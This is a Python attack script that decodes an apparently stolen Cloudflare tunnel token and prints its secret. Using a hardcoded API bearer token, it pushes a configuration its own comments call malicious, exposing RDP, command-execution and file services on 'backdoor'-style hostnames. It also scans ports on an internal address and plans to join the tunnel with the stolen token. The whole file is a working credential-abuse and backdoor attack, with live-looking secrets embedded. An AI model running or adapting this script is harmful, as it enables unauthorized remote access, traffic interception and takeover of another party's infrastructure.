import base64
import json
import subprocess
import time
import socket
import os

TOKEN = "eyJhIjoiNGMyOTMyYmMzMzgxYmUzOGQ1MjY2MjQxYjE2YmUwOTIiLCJ0IjoiOTI2ZWFjNWUtMjY0Mi00YTE2LTllZGMtYzA2YjZjNzA1YWI4IiwicyI6Ik1USTJNR0l6TURrdFpHTTBOaTAwTWpBMUxXRmhNV0V0T1dFNU5tVXpPRFU0WkRVdyJ9"

print("=== TUNNEL TOKEN ANALYSIS ===\n")

decoded = base64.b64decode(TOKEN)
token_data = json.loads(decoded)
print(f"Decoded token: {json.dumps(token_data, indent=2)}")

print(f"\nAccount ID: {token_data.get('a')}")
print(f"Tunnel ID: {token_data.get('t')}")

secret_b64 = token_data.get('s', '')
if secret_b64:
    try:
        secret = base64.b64decode(secret_b64)
        print(f"Secret (decoded): {secret}")
    except:
        print(f"Secret (raw): {secret_b64}")

print("\n=== EXPLOITATION ATTEMPTS ===\n")

print("[1] Attempting to run cloudflared with stolen token...")
print("    This would allow us to join the tunnel from THIS machine")
print("    and potentially intercept/inject traffic")

config = f"""
tunnel: {token_data.get('t')}
credentials-file: /dev/null

ingress:
  - hostname: backdoor.ai-smith.net
    service: http://localhost:8888
  - service: http_status:404
"""

print(f"\n[2] Potential config injection:")
print(config)

print("\n[3] Testing if we can add a malicious ingress rule via API...")
import urllib.request

CF_TOKEN = "ySIb_2uMzHQDvnK5MulcCvOiRKsC6k0pH188bG8Y"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"  
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"

malicious_config = {
    "config": {
        "ingress": [
            {"hostname": "rdp.ai-smith.net", "service": "tcp://localhost:3389"},
            {"hostname": "exec.ai-smith.net", "service": "http://localhost:9999", 
             "originRequest": {"httpHostHeader": "localhost", "noTLSVerify": True}},
            {"hostname": "file.ai-smith.net", "service": "http://localhost:80"},
            {"service": "http_status:404"}
        ],
        "warp-routing": {"enabled": True}
    }
}

headers = {
    "Authorization": f"Bearer {CF_TOKEN}",
    "Content-Type": "application/json"
}

try:
    data = json.dumps(malicious_config).encode()
    req = urllib.request.Request(
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        data=data,
        headers=headers,
        method="PUT"
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        result = json.loads(resp.read())
        if result.get("success"):
            print(f"    [+] Config updated to version {result['result']['version']}")
        else:
            print(f"    [-] Failed: {result.get('errors')}")
except Exception as e:
    print(f"    [-] Error: {e}")

print("\n[4] Checking for any HTTP services on common ports via new config...")
for port in [80, 8080, 8000, 9999]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex(("192.168.1.104", port)) == 0:
            print(f"    [+] Port {port} accessible!")
        sock.close()
    except:
        pass

print("\n[5] Attempting direct tunnel connection with token...")
print("    Running: cloudflared tunnel --token <TOKEN> run")
